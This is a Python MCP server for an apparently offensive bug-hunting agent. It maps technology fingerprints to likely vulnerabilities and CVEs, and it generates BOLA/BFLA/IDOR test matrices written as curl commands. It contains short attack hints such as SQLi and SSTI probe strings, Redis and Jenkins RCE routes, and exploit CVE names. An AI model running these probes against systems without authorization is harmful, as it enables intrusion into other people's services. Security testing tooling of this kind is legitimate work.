#!/usr/bin/env python3
"""
mcp-hunter: CCO Bug-Hunting Intelligence Katmanı (zeka → gerçek bug bulma)
==========================================================================
CCO'nun "scanner"dan "hunter"a geçişini sağlayan biliş katmanı. Mevcut
reasoning/validator/memory altyapısını GERÇEK ödül kazandıran zafiyet sınıflarına
yönlendirir — özellikle otomatik tarayıcıların KAÇIRDIĞI sınıflara:

  H1. PREDICTIVE VULN INTELLIGENCE — `predict_vulnerabilities`: teknoloji parmak
      izinden (stack/banner/memory) HANGİ zafiyet sınıflarının + CVE ailelerinin
      muhtemel olduğunu DETERMİNİSTİK tahmin eder; hedefli hipotez + RAG sorgusu
      üretir. "Körlemesine tarama" yerine "stack'e özel hipotez".
  H2. ACCESS-CONTROL INTELLIGENCE (BOLA/BFLA/IDOR) — `build_authz_matrix` +
      `analyze_authz_result`: çok-kimlikli yetkilendirme matrisi kurar (anon/userA/
      userB/admin × kaynaklar) ve farksal (differential) bir oracle ile yetki
      ihlalini KANITLAR. Bozuk erişim kontrolü = OWASP #1 ve bug bounty'de en çok
      ödeyen sınıf; tarayıcılar burada zayıftır.
  H3. BUSINESS-LOGIC ABUSE — `generate_abuse_cases`: fiyat/miktar/rol/kupon/iş-akışı/
      race semantiğine göre kötüye-kullanım senaryoları üretir. AI'nın tarayıcıyı
      ezdiği sınıf (mantık hataları imza ile bulunamaz).
  H4. VARIANT ANALYSIS — `hunt_variants`: DOĞRULANMIŞ bir bulgudan yola çıkıp aynı
      sınıfı "başka nerede?" diye sistematik arar (kardeş param/endpoint/method/
      content-type/subdomain). Bug bounty avcısının elle yaptığı çoğaltmayı otomatik
      yapar → tek bulgudan çok bulgu.
  H5. ATTACK-SURFACE COVERAGE — `coverage_report`: (endpoint × zafiyet-sınıfı) test
      edildi/edilmedi matrisini çıkarır, tamamlanma %'sini ve en değerli TEST
      EDİLMEMİŞ boşlukları sıralar → kör nokta = kaçırılan bug'ı engeller.

Tüm çekirdek deterministiktir (LLM/network gerekmez → offline test edilir). LLM
anahtarı varsa H1/H3 LLM ile zenginleştirilir (graceful fallback). Veri kaynağı:
`~/.cco/agent_memory.db` (findings/endpoints) + `~/.cco/lessons.db` (öğrenme).
"""
import os
import re
import json
import time
import sqlite3
import hashlib
from urllib.parse import urlparse, urlunparse, parse_qsl, urlencode

import requests
from mcp.server.fastmcp import FastMCP

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass

CCO_HOME = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))
os.makedirs(CCO_HOME, exist_ok=True)
MEM_DB = os.path.join(CCO_HOME, "agent_memory.db")
LESSONS_DB = os.path.join(CCO_HOME, "lessons.db")

OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
DEEPSEEK_URL = os.environ.get("DEEPSEEK_BASE_URL", "https://api.deepseek.com").rstrip("/") + "/chat/completions"

mcp = FastMCP(
    "hunter",
    instructions="CCO bug-hunting zekası — predictive vuln intelligence, access-control "
                 "(BOLA/BFLA/IDOR) matrisi + farksal oracle, business-logic abuse, variant "
                 "analizi ve attack-surface coverage. Tarayıcıların kaçırdığı yüksek-ödüllü "
                 "sınıflara odaklanır."
)


# ─────────────────────── LLM sağlayıcı (opsiyonel zenginleştirme) ───────────────────────
def _config_value(*keys):
    for path in (os.path.join(CCO_HOME, "config.yaml"), os.path.join(CCO_HOME, "settings.json")):
        try:
            if not os.path.exists(path):
                continue
            if path.endswith((".yaml", ".yml")):
                import yaml
                data = yaml.safe_load(open(path)) or {}
            else:
                data = json.load(open(path))
            for k in keys:
                v = data.get("llm", {}).get(k) or data.get(k)
                if v:
                    return v
        except Exception:
            pass
    return ""


def _openrouter_key():
    return (os.environ.get("OPENROUTER_API_KEY") or os.environ.get("ANTHROPIC_AUTH_TOKEN", "")
            or _config_value("openrouter_api_key"))


def _deepseek_key():
    return os.environ.get("DEEPSEEK_API_KEY", "") or _config_value("deepseek_api_key")


def _any_llm_key():
    return bool(_deepseek_key() or _openrouter_key())


def _model():
    if os.environ.get("CCO_REASON_MODEL"):
        return os.environ["CCO_REASON_MODEL"]
    return "deepseek-reasoner" if _deepseek_key() else "qwen/qwen3.6-plus"


def _chat(system, user, temperature=0.4, max_tokens=900, timeout=90):
    model = _model()
    if (model or "").lower().startswith("deepseek"):
        url, key = DEEPSEEK_URL, _deepseek_key()
    else:
        url, key = OPENROUTER_URL, _openrouter_key()
    if not key:
        return None, "no_api_key"
    headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/json"}
    if url == OPENROUTER_URL:
        headers.update({"HTTP-Referer": "https://cco.local", "X-Title": "CCO Hunter"})
    data = {"model": model, "temperature": temperature, "max_tokens": max_tokens, "stream": False,
            "messages": [{"role": "system", "content": system}, {"role": "user", "content": user}]}
    try:
        r = requests.post(url, headers=headers, json=data, timeout=timeout)
        r.raise_for_status()
        return r.json()["choices"][0]["message"]["content"], None
    except Exception as e:
        return None, str(e)


# ─────────────────────────── Ortak zafiyet metadatası ───────────────────────────
VULN_IMPACT = {
    "rce": 1.0, "command_injection": 1.0, "deserialization": 0.95, "ssti": 0.95,
    "sql_injection": 0.9, "bola": 0.85, "idor": 0.8, "bfla": 0.85, "mass_assignment": 0.85,
    "authentication_bypass": 0.85, "privilege_escalation": 0.85, "business_logic": 0.8,
    "price_manipulation": 0.85, "race_condition": 0.8, "file_upload": 0.85,
    "lfi": 0.75, "path_traversal": 0.75, "ssrf": 0.75, "xxe": 0.7, "jwt_attack": 0.7,
    "xss_stored": 0.7, "broken_access_control": 0.85, "workflow_bypass": 0.7,
    "xss_reflected": 0.5, "cors_misconfiguration": 0.5, "open_redirect": 0.35,
    "csrf": 0.45, "subdomain_takeover": 0.6, "info_disclosure": 0.4,
}
VULN_LIKELIHOOD = {  # bir sınıf bulunabilirlik priorı (deterministik)
    "info_disclosure": 0.6, "idor": 0.55, "bola": 0.55, "open_redirect": 0.5,
    "xss_reflected": 0.5, "business_logic": 0.5, "mass_assignment": 0.45, "bfla": 0.45,
    "sql_injection": 0.45, "ssti": 0.4, "cors_misconfiguration": 0.45, "jwt_attack": 0.4,
    "price_manipulation": 0.5, "race_condition": 0.35, "ssrf": 0.4, "lfi": 0.4,
    "path_traversal": 0.4, "file_upload": 0.4, "xxe": 0.35, "deserialization": 0.3,
    "rce": 0.3, "command_injection": 0.35, "authentication_bypass": 0.4,
    "workflow_bypass": 0.45, "broken_access_control": 0.55, "subdomain_takeover": 0.4,
}
VALIDATE_WITH = {
    "sql_injection": "mcp__validator__validate_sqli", "ssti": "mcp__validator__validate_ssti",
    "command_injection": "mcp__validator__validate_command_injection",
    "rce": "mcp__validator__validate_command_injection",
    "lfi": "mcp__validator__validate_path_traversal",
    "path_traversal": "mcp__validator__validate_path_traversal",
    "xss_reflected": "mcp__validator__validate_xss_reflection",
    "xss_stored": "mcp__validator__validate_xss_reflection",
    "open_redirect": "mcp__validator__validate_open_redirect",
    "ssrf": "mcp__validator__validate_ssrf_oob", "xxe": "mcp__validator__validate_xxe",
    "idor": "mcp__validator__validate_idor", "bola": "mcp__validator__validate_idor",
    "bfla": "mcp__validator__validate_auth_bypass",
    "authentication_bypass": "mcp__validator__validate_auth_bypass",
    "broken_access_control": "mcp__hunter__analyze_authz_result",
    "business_logic": "manuel diferansiyel doğrulama (beklenen vs gözlenen)",
    "price_manipulation": "manuel: sipariş toplamını/ödemeyi doğrula",
    "race_condition": "manuel: eşzamanlı istek + tekil-kaynak sayacı",
    "mass_assignment": "manuel: yanıtta enjekte edilen ayrıcalıklı alanı doğrula",
}
SKILL_FOR = {
    "sql_injection": "/web-exploit", "ssti": "/web-exploit", "lfi": "/web-exploit",
    "path_traversal": "/web-exploit", "command_injection": "/web-exploit", "rce": "/web-exploit",
    "file_upload": "/web-exploit", "xss_reflected": "/web-exploit", "xss_stored": "/web-exploit",
    "idor": "/access-control-hunting", "bola": "/access-control-hunting",
    "bfla": "/access-control-hunting", "broken_access_control": "/access-control-hunting",
    "mass_assignment": "/access-control-hunting", "business_logic": "/access-control-hunting",
    "price_manipulation": "/access-control-hunting", "race_condition": "/access-control-hunting",
    "workflow_bypass": "/access-control-hunting", "privilege_escalation": "/access-control-hunting",
    "jwt_attack": "/web-advanced", "cors_misconfiguration": "/web-advanced",
    "xxe": "/web-advanced", "open_redirect": "/web-advanced", "deserialization": "/web-advanced",
    "authentication_bypass": "/web-advanced", "ssrf": "/cloud-exploitation",
    "subdomain_takeover": "/attack-surface-mapping", "info_disclosure": "/attack-surface-mapping",
}


def _impact(v):
    return VULN_IMPACT.get(v, 0.5)


def _ev(v):
    return round(VULN_LIKELIHOOD.get(v, 0.4) * _impact(v), 4)


def _hook(v):
    return VALIDATE_WITH.get(v, "mcp__validator__validate_finding")


# ─────────────────────────── Memory okuma ───────────────────────────
def _read_findings(target):
    out = []
    try:
        conn = sqlite3.connect(MEM_DB)
        q = "SELECT type, severity, description, payload FROM findings"
        p = ()
        if target:
            q += " WHERE target=?"
            p = (target,)
        for typ, sev, desc, pl in conn.execute(q, p).fetchall():
            out.append({"type": typ or "", "severity": (sev or "info").lower(),
                        "description": desc or "", "payload": pl or ""})
        conn.close()
    except Exception:
        pass
    return out


def _read_endpoints(target):
    out = []
    try:
        conn = sqlite3.connect(MEM_DB)
        q = "SELECT url_or_port, protocol, state, technologies FROM endpoints"
        p = ()
        if target:
            q += " WHERE target=?"
            p = (target,)
        for url, proto, state, tech in conn.execute(q, p).fetchall():
            out.append({"url_or_port": url or "", "protocol": proto or "",
                        "state": state or "", "technologies": tech or ""})
        conn.close()
    except Exception:
        pass
    return out


def _tested_classes(target):
    """Bu hedef için (findings + lessons) DENENMİŞ zafiyet sınıfları (normalize)."""
    classes = set()
    for f in _read_findings(target):
        classes.add(_norm_class(f["type"]))
    try:
        conn = sqlite3.connect(LESSONS_DB)
        for (tech,) in conn.execute("SELECT DISTINCT technique FROM lessons").fetchall():
            classes.add(_norm_class(tech or ""))
        conn.close()
    except Exception:
        pass
    classes.discard("")
    return classes


_CLASS_SYN = [
    ("sql", "sql_injection"), ("sqli", "sql_injection"), ("bola", "bola"),
    ("broken object", "bola"), ("broken function", "bfla"), ("bfla", "bfla"),
    ("idor", "idor"), ("insecure direct", "idor"), ("mass assign", "mass_assignment"),
    ("business logic", "business_logic"), ("price", "price_manipulation"),
    ("race", "race_condition"), ("workflow", "workflow_bypass"),
    ("privilege", "privilege_escalation"), ("priv esc", "privilege_escalation"),
    ("access control", "broken_access_control"), ("ssti", "ssti"),
    ("template injection", "ssti"), ("command inj", "command_injection"),
    ("os command", "command_injection"), ("remote code", "rce"), ("ssrf", "ssrf"),
    ("xxe", "xxe"), ("path traversal", "path_traversal"), ("directory traversal", "path_traversal"),
    ("lfi", "lfi"), ("file inclusion", "lfi"), ("file upload", "file_upload"),
    ("stored xss", "xss_stored"), ("reflected xss", "xss_reflected"), ("xss", "xss_reflected"),
    ("open redirect", "open_redirect"), ("cors", "cors_misconfiguration"),
    ("jwt", "jwt_attack"), ("deserial", "deserialization"), ("auth bypass", "authentication_bypass"),
    ("authentication bypass", "authentication_bypass"), ("subdomain takeover", "subdomain_takeover"),
    ("disclosure", "info_disclosure"), ("leak", "info_disclosure"),
]


def _norm_class(s):
    low = (s or "").strip().lower()
    for needle, key in _CLASS_SYN:
        if needle in low:
            return key
    return re.sub(r"[^a-z0-9]+", "_", low).strip("_")


# ═══════════════════════ H1. PREDICTIVE VULN INTELLIGENCE ═══════════════════════
# Teknoloji token → (muhtemel sınıflar, CVE ailesi, hedefli not, RAG sorgusu)
TECH_VULN_DB = {
    "wordpress": (["sql_injection", "file_upload", "xss_stored", "authentication_bypass", "idor"],
                  "WordPress core + plugin/theme CVE'leri (wpscan DB)",
                  "Asıl risk plugin/theme'ler; sürüm + plugin/user enum şart (wp-json/wp/v2/users).",
                  "wordpress plugin sql injection rce arbitrary file upload CVE"),
    "drupal": (["sql_injection", "rce", "authentication_bypass"],
               "Drupalgeddon (CVE-2014-3704, SA-CORE-2018-002/004)",
               "Sürümü çek; Drupalgeddon2 (CVE-2018-7600) form API RCE.",
               "drupal drupalgeddon CVE-2018-7600 rce"),
    "joomla": (["sql_injection", "rce", "lfi"], "Joomla com_* extension CVE'leri",
               "3. parti component'ler en zayıf halka.", "joomla component sql injection rce CVE"),
    "apache": (["path_traversal", "rce", "info_disclosure"],
               "CVE-2021-41773/42013 (path traversal→RCE), mod_cgi",
               "Apache 2.4.49/2.4.50 path traversal + cgi → RCE; sürüm banner'ı kontrol et.",
               "apache 2.4.49 CVE-2021-41773 path traversal rce"),
    "nginx": (["path_traversal", "info_disclosure", "ssrf"],
              "alias misconfig (off-by-slash), merge_slashes",
              "location/alias off-by-slash → kaynak sızıntısı; proxy_pass SSRF.",
              "nginx alias traversal off-by-slash misconfiguration"),
    "tomcat": (["deserialization", "rce", "path_traversal"],
               "Ghostcat (CVE-2020-1938 AJP), manager upload",
               "AJP 8009 açıksa Ghostcat dosya okuma/include; /manager zayıf cred.",
               "apache tomcat ghostcat CVE-2020-1938 ajp manager rce"),
    "jboss": (["deserialization", "rce"], "JBoss/JMX-console deserialization",
              "invoker/JMXInvokerServlet → Java deserialization RCE.",
              "jboss jmx invoker deserialization rce"),
    "struts": (["rce", "ssti"], "Apache Struts OGNL (CVE-2017-5638, S2-*)",
               "Content-Type OGNL enjeksiyonu → RCE (S2-045/057).",
               "apache struts ognl CVE-2017-5638 S2-045 rce"),
    "spring": (["ssti", "rce", "info_disclosure"],
               "Spring4Shell (CVE-2022-22965), actuator exposure",
               "Actuator /env,/heapdump sızıntısı; Spring4Shell sınıf binding RCE.",
               "spring4shell CVE-2022-22965 actuator env heapdump"),
    "laravel": (["rce", "info_disclosure", "deserialization"],
                "CVE-2021-3129 (debug Ignition RCE), APP_KEY deserialization",
                "APP_DEBUG=true + Ignition → RCE; sızan APP_KEY → cookie deserialization.",
                "laravel ignition CVE-2021-3129 debug rce app_key"),
    "django": (["ssti", "info_disclosure", "open_redirect"],
               "DEBUG=True bilgi sızıntısı, SSTI (özel)",
               "DEBUG sayfası SECRET_KEY/ortam sızdırır; admin path enum.",
               "django debug=true information disclosure secret_key"),
    "flask": (["ssti", "deserialization"], "Jinja2 SSTI, pickle session",
              "{{7*7}} SSTI; SECRET_KEY sızarsa session forge.",
              "flask jinja2 ssti server side template injection"),
    "jinja": (["ssti"], "Jinja2 SSTI", "{{7*7}}/{{config}} → SSTI→RCE.",
              "jinja2 ssti rce payload"),
    "express": (["ssti", "deserialization", "mass_assignment", "ssrf"],
                "Node prototype pollution, pug/handlebars SSTI",
                "Prototype pollution + gadget → RCE; SSTI engine'e bağlı.",
                "nodejs express prototype pollution ssti rce"),
    "node": (["deserialization", "ssti", "mass_assignment", "ssrf"],
             "node-serialize RCE, prototype pollution",
             "node-serialize/funcster gadget; __proto__ pollution.",
             "nodejs deserialization prototype pollution rce"),
    "php": (["lfi", "rce", "file_upload", "sql_injection"],
            "LFI→RCE (wrapper/log poisoning), type juggling",
            "php://filter, data://, log poisoning; '==' type juggling auth bypass.",
            "php lfi rce log poisoning php filter wrapper"),
    "asp": (["deserialization", "path_traversal", "xxe"],
            "ViewState deserialization, padding oracle (MS10-070)",
            "Sızan machineKey → ViewState RCE; .NET deserialization.",
            "asp.net viewstate deserialization machinekey rce"),
    "iis": (["path_traversal", "info_disclosure"], "IIS short-name (~), tilde enum",
            "8.3 short-name enum; WebDAV.", "iis tilde short name enumeration webdav"),
    "graphql": (["idor", "bola", "info_disclosure", "sql_injection", "business_logic"],
                "GraphQL introspection, batching, nested DoS",
                "Introspection açık mı? alias batching brute; her resolver'da BOLA dene.",
                "graphql introspection idor batching authorization bypass"),
    "jwt": (["jwt_attack", "authentication_bypass", "bfla"],
            "alg=none, weak HMAC secret, kid injection",
            "alg none/HS256-RS256 confusion; zayıf secret crack; kid path traversal.",
            "jwt alg none hs256 rs256 confusion kid injection"),
    "oauth": (["open_redirect", "authentication_bypass", "account_takeover"],
              "redirect_uri laxity, state CSRF, token leak",
              "redirect_uri açık → token sızdırma; state yoksa CSRF; code reuse.",
              "oauth redirect_uri bypass token leak account takeover"),
    "saml": (["xxe", "authentication_bypass", "xml_signature_wrapping"],
             "XML signature wrapping, XXE, comment injection",
             "XSW ile assertion sahteciliği; XXE; canonicalization comment.",
             "saml xml signature wrapping xxe authentication bypass"),
    "api": (["bola", "bfla", "mass_assignment", "idor", "business_logic", "info_disclosure"],
            "OWASP API Top 10 (BOLA/BFLA/mass-assignment)",
            "Her object id'de BOLA; admin fonksiyonlarında BFLA; gizli alan mass-assignment.",
            "owasp api top 10 BOLA BFLA mass assignment"),
    "rest": (["bola", "bfla", "mass_assignment", "idor"], "OWASP API Top 10",
             "Method tampering (GET→PUT/DELETE); id manipülasyonu.",
             "rest api BOLA mass assignment method tampering"),
    "s3": (["info_disclosure", "broken_access_control"], "Public bucket, ACL misconfig",
           "Liste/okuma/yazma ACL; bucket takeover.", "aws s3 bucket public acl misconfiguration"),
    "aws": (["ssrf", "info_disclosure", "broken_access_control"],
            "SSRF→IMDS (169.254.169.254), IAM over-perm",
            "SSRF varsa IMDSv1 role kimlik bilgisi; metadata.", "aws ssrf imds iam credential metadata"),
    "elasticsearch": (["info_disclosure", "rce"], "Unauth 9200, CVE-2015-1427 Groovy RCE",
                      "9200 unauth ise tüm index; eski sürüm Groovy/MVEL RCE.",
                      "elasticsearch unauthenticated 9200 rce CVE-2015-1427"),
    "redis": (["rce", "info_disclosure"], "Unauth 6379 → RCE (cron/SSH key)",
              "Unauth Redis → webroot/SSH key yazma.", "redis unauthenticated rce config set dir"),
    "mongodb": (["info_disclosure", "authentication_bypass"], "Unauth 27017, NoSQL injection",
                "Unauth DB; $ne/$gt NoSQL auth bypass.", "mongodb unauthenticated nosql injection auth bypass"),
    "jenkins": (["rce", "info_disclosure"], "Script console RCE, CVE-2018-1000861",
                "/script Groovy RCE; anon read.", "jenkins script console groovy rce CVE-2018-1000861"),
    "git": (["info_disclosure"], ".git exposure → kaynak/secret",
            "/.git/ açıksa dump + secret/credential.", "exposed .git directory source code disclosure"),
    "login": (["authentication_bypass", "sql_injection", "business_logic", "bfla"],
              "Auth bypass, SQLi, rate-limit yok",
              "' OR 1=1; OTP/parola brute; response manipülasyonu.",
              "login authentication bypass sql injection rate limit"),
    "upload": (["file_upload", "path_traversal", "xxe"], "Unrestricted file upload",
               "Uzantı/content-type/magic byte bypass → webshell.",
               "unrestricted file upload bypass webshell"),
    "payment": (["price_manipulation", "business_logic", "race_condition", "idor"],
                "Fiyat/tutar tampering, race double-spend",
                "İstemci-taraflı fiyat; negatif miktar; race ile çift kullanım.",
                "payment price manipulation race condition business logic"),
    "checkout": (["price_manipulation", "business_logic", "workflow_bypass", "race_condition"],
                 "Sepet/checkout iş akışı bypass",
                 "Adım atlama; kupon stacking; negatif adet.",
                 "checkout workflow bypass coupon stacking negative quantity"),
}


@mcp.tool()
def predict_vulnerabilities(target: str = "", fingerprint: str = "", context: str = "",
                            top_n: int = 10) -> str:
    """H1 — PREDICTIVE VULN INTELLIGENCE. Teknoloji parmak izinden (fingerprint +
    memory'deki endpoint teknolojileri) HANGİ zafiyet sınıflarının ve CVE ailelerinin
    muhtemel olduğunu DETERMİNİSTİK tahmin eder; her tahmin için hedefli hipotez,
    doğrulama hook'u, RAG sorgusu ve tetiklenecek skill verir. "Körlemesine tarama"yı
    "stack'e özel hipoteze" çevirir → ilk denemede doğru vektör.

    Args:
        target: Hedef (memory'den endpoint teknolojilerini okur)
        fingerprint: Stack/banner/teknoloji metni (whatweb/wappalyzer/nmap çıktısı)
        context: Ek bağlam (uygulama tipi: e-ticaret, bankacılık, SaaS...)
        top_n: Döndürülecek tahmin sayısı
    """
    endpoints = _read_endpoints(target) if target else []
    blob = " ".join([
        fingerprint, context,
        " ".join(e["technologies"] + " " + e["url_or_port"] for e in endpoints),
    ]).lower()

    matched_tech, agg = [], {}
    for tech, (vulns, cve_family, note, rag) in TECH_VULN_DB.items():
        if tech in blob:
            matched_tech.append(tech)
            for v in vulns:
                rec = agg.setdefault(v, {"vuln_class": v, "from_tech": [], "cve_families": set(),
                                         "hints": [], "rag_queries": set()})
                rec["from_tech"].append(tech)
                rec["cve_families"].add(cve_family)
                rec["hints"].append(f"[{tech}] {note}")
                rec["rag_queries"].add(rag)

    predictions = []
    for v, rec in agg.items():
        evidence_boost = min(0.25, 0.08 * len(rec["from_tech"]))
        confidence = round(min(0.95, VULN_LIKELIHOOD.get(v, 0.4) + evidence_boost), 3)
        predictions.append({
            "vuln_class": v,
            "confidence": confidence,
            "impact": _impact(v),
            "priority_score": round(confidence * _impact(v), 4),
            "predicted_from": rec["from_tech"],
            "cve_families": sorted(rec["cve_families"]),
            "hypothesis": rec["hints"][0],
            "validate_with": _hook(v),
            "trigger_skill": SKILL_FOR.get(v, "/web-exploit"),
            "rag_query": sorted(rec["rag_queries"])[0],
        })
    predictions.sort(key=lambda p: p["priority_score"], reverse=True)
    predictions = predictions[:max(1, int(top_n))]

    result = {
        "engine": "deterministic tech→vuln signature intelligence",
        "target": target or "(verilmedi)",
        "matched_technologies": matched_tech,
        "predictions": predictions,
        "test_plan": [f"{p['vuln_class']} → {p['trigger_skill']} ile test, {p['validate_with']} "
                      f"ile doğrula (RAG: rag_search('{p['rag_query']}'))" for p in predictions[:6]],
        "note": "priority_score = confidence × impact. Tahminler hipotezdir; validator ile "
                "CONFIRMED yapılana kadar exploit'i derinleştirme. CVE aileleri için rag_search kullan.",
    }
    if not matched_tech:
        result["advice"] = ("Parmak izi tanınmadı — fingerprint ver (whatweb/wappalyzer çıktısı) "
                            "veya recon yapıp store_endpoint(technologies=...) ile kaydet.")

    if _any_llm_key() and matched_tech:
        sys = ("You are an elite bug bounty hunter in an authorized lab. Given a tech stack and "
               "deterministic vuln predictions, add up to 3 NON-OBVIOUS, stack-specific bug "
               "hypotheses scanners miss (logic flaws, chained CVEs, config gaps). One line each, "
               "concrete and testable.")
        usr = f"Stack: {', '.join(matched_tech)}\nContext: {context}\nKnown predictions: " + \
              ", ".join(p["vuln_class"] for p in predictions)
        extra, err = _chat(sys, usr, temperature=0.6, max_tokens=400)
        result["llm_extra_hypotheses"] = extra
        if err:
            result["llm_note"] = f"LLM zenginleştirme yok ({err}); deterministik tahminler geçerli."
    return json.dumps(result, indent=2, ensure_ascii=False)


# ═══════════════════ H2. ACCESS-CONTROL INTELLIGENCE (BOLA/BFLA/IDOR) ═══════════════════
_OBJ_ID_RE = re.compile(r"(/\d+)(/|$|\?)|[?&](id|uid|user_id|account|order|invoice|doc|file|"
                        r"pid|oid|number|ref)=|/(users?|accounts?|orders?|invoices?|documents?|"
                        r"files?|messages?|profiles?)/[\w-]+", re.I)
_PRIV_PATH_RE = re.compile(r"(admin|manage|internal|config|settings|console|dashboard|approve|"
                           r"delete|grant|role|permission|audit|users?/all|export|backup)", re.I)


def _resource_kind(url):
    """Bir kaynağın object-level mi (BOLA/IDOR) yoksa function-level mi (BFLA) olduğunu sınıflar."""
    priv = bool(_PRIV_PATH_RE.search(url or ""))
    has_numeric_id = bool(re.search(r"/\d+(/|$|\?)|[?&]\w*id=\d+", url or "", re.I))
    obj = bool(_OBJ_ID_RE.search(url or ""))
    # Ayrıcalıklı yol + sayısal obje id YOKSA → fonksiyon-seviye (admin/manage/export/delete = BFLA)
    if priv and not has_numeric_id:
        return "function_level"
    if obj:
        return "object_level"     # BOLA / IDOR
    if priv:
        return "function_level"
    return "generic"


def _parse_list(s):
    s = (s or "").strip()
    if not s:
        return []
    if s.startswith("["):
        try:
            return [str(x) for x in json.loads(s)]
        except Exception:
            pass
    return [x.strip() for x in s.split(",") if x.strip()]


@mcp.tool()
def build_authz_matrix(target: str = "", identities: str = "", resources: str = "",
                       object_ids: str = "") -> str:
    """H2 — ACCESS-CONTROL INTELLIGENCE (BOLA/BFLA/IDOR matrisi). Çok-kimlikli bir
    YETKİLENDİRME TEST MATRİSİ kurar: kimlikler (anon/userA/userB/admin) × kaynaklar
    (endpoint'ler). Her kaynağı object-level (BOLA/IDOR) veya function-level (BFLA/
    privilege) olarak sınıflar ve farksal (differential) test planı üretir: düşük-yetkili
    kimliğin başkasının objesine / ayrıcalıklı fonksiyona erişip erişemediği. Bozuk
    erişim kontrolü = OWASP #1 ve bug bounty'de en çok ödeyen sınıf; tarayıcılar zayıf.

    Args:
        target: Hedef (resources boşsa memory endpoint'lerinden çeker)
        identities: Kimlikler — "anon,userA,userB,admin" veya JSON liste
        resources: Test edilecek URL/endpoint'ler (virgül veya JSON); boşsa memory'den
        object_ids: userA'ya AİT örnek obje id'leri (userB ile erişim denenecek) — virgül/JSON
    """
    ids = _parse_list(identities) or ["anon", "userA", "userB", "admin"]
    res = _parse_list(resources)
    if not res:
        res = [e["url_or_port"] for e in _read_endpoints(target)
               if "/" in e["url_or_port"] or "?" in e["url_or_port"]]
    owned = _parse_list(object_ids)

    # düşük→yüksek ayrıcalık sırası (ilk = en düşük)
    def _rank(i):
        low = i.lower()
        if "anon" in low or "guest" in low or "public" in low:
            return 0
        if "admin" in low or "root" in low or "super" in low:
            return 3
        return 1
    ids_sorted = sorted(ids, key=_rank)
    low_priv = [i for i in ids_sorted if _rank(i) <= 1]
    anon_ids = [i for i in ids if _rank(i) == 0]

    tests, by_type = [], {"bola": 0, "bfla": 0, "unauth": 0}
    if not res:
        return json.dumps({
            "matrix": [], "identities": ids,
            "advice": "Kaynak yok — resources ver veya recon yapıp store_endpoint ile URL kaydet.",
        }, indent=2, ensure_ascii=False)

    for url in res:
        kind = _resource_kind(url)
        # 1) Unauth erişim (anon korunan kaynağa)
        for a in anon_ids:
            tests.append({
                "test_type": "unauth", "vuln_class": "broken_access_control",
                "identity": a, "resource": url, "method": "GET",
                "expectation": "401/403 beklenir",
                "violation_if": "2xx + korunan içerik döndü → kimlik doğrulama atlandı",
                "request_plan": f"curl -s -o /dev/null -w '%{{http_code}}' '{url}'  # token YOK",
                "impact": _impact("broken_access_control"),
                "validate_with": "mcp__hunter__analyze_authz_result",
            })
            by_type["unauth"] += 1
        if kind == "object_level":
            # 2) BOLA/IDOR — düşük-yetkili kullanıcı, başkasının (owned) objesine
            victims = low_priv or ids_sorted[:2]
            id_samples = owned or ["<userA_object_id>", "<diğer_kullanıcı_id>"]
            for a in victims:
                if _rank(a) == 0:
                    continue
                for oid in id_samples[:3]:
                    sub = _substitute_id(url, oid)
                    tests.append({
                        "test_type": "bola", "vuln_class": "bola",
                        "identity": a, "resource": sub, "method": "GET",
                        "expectation": f"{a} sahibi olmadığı '{oid}' için 403/404 beklenir",
                        "violation_if": "2xx + BAŞKA kullanıcının verisi (owner yanıtıyla aynı) → BOLA/IDOR",
                        "request_plan": f"curl -s '{sub}' -H 'Authorization: Bearer <{a}_token>'",
                        "impact": _impact("bola"),
                        "validate_with": "mcp__hunter__analyze_authz_result",
                    })
                    by_type["bola"] += 1
        if kind == "function_level":
            # 3) BFLA — düşük-yetkili kullanıcı ayrıcalıklı fonksiyonu çağırır
            for a in low_priv:
                if _rank(a) == 0:
                    continue
                for method in ["GET", "POST", "PUT", "DELETE"]:
                    if method == "GET" and _PRIV_PATH_RE.search(url) and \
                       re.search(r"(delete|approve|grant|export|backup)", url, re.I):
                        continue
                    tests.append({
                        "test_type": "bfla", "vuln_class": "bfla",
                        "identity": a, "resource": url, "method": method,
                        "expectation": f"{a} ayrıcalıklı fonksiyon için 403 beklenir",
                        "violation_if": f"{method} 2xx + işlem gerçekleşti → BFLA (fonksiyon-seviye yetki ihlali)",
                        "request_plan": f"curl -s -X {method} '{url}' -H 'Authorization: Bearer <{a}_token>'",
                        "impact": _impact("bfla"),
                        "validate_with": "mcp__hunter__analyze_authz_result",
                    })
                    by_type["bfla"] += 1

    tests.sort(key=lambda t: t["impact"], reverse=True)
    return json.dumps({
        "engine": "multi-identity differential authorization matrix (BOLA/BFLA/IDOR)",
        "target": target or "(tümü)", "identities": ids_sorted,
        "resources_tested": len(res), "tests_generated": len(tests),
        "by_type": by_type, "matrix": tests[:60],
        "methodology": "Her test ÇALIŞTIR → yanıtları topla → mcp__hunter__analyze_authz_result "
                       "ile farksal oracle'a ver (owner vs attacker). owner ile AYNI 2xx içerik = ihlal KANITI.",
        "note": "Object-level (id içeren) kaynaklar BOLA/IDOR; admin/manage/delete gibi yollar "
                "BFLA; anon istekleri unauth. OWASP API #1+#5. owned id'leri ver → gerçek "
                "kurban objesiyle test (placeholder yerine).",
    }, indent=2, ensure_ascii=False)


def _substitute_id(url, oid):
    """URL'deki obje id'sini verilen değerle değiştirir (path veya query)."""
    if re.search(r"[?&](id|uid|user_id|account|order|invoice|doc|file|pid|oid|number|ref)=", url, re.I):
        return re.sub(r"([?&](?:id|uid|user_id|account|order|invoice|doc|file|pid|oid|number|ref)=)[^&]*",
                      lambda m: m.group(1) + str(oid), url, flags=re.I)
    if re.search(r"/\d+(/|$|\?)", url):
        return re.sub(r"/\d+(/|$|\?)", f"/{oid}" + r"\1", url, count=1)
    if re.search(r"/(users?|accounts?|orders?|invoices?|documents?|files?|messages?|profiles?)/[\w-]+",
                 url, re.I):
        return re.sub(r"(/(?:users?|accounts?|orders?|invoices?|documents?|files?|messages?|profiles?)/)[\w-]+",
                      lambda m: m.group(1) + str(oid), url, count=1, flags=re.I)
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}id={oid}"


def _body_sig(entry):
    """Bir yanıt için karşılaştırma imzası (hash öncelikli, yoksa uzunluk)."""
    h = entry.get("body_hash")
    if not h and entry.get("body") is not None:
        h = hashlib.sha256(str(entry["body"]).encode("utf-8", "ignore")).hexdigest()
    return h, entry.get("body_len", len(str(entry.get("body", ""))) if entry.get("body") is not None else None)


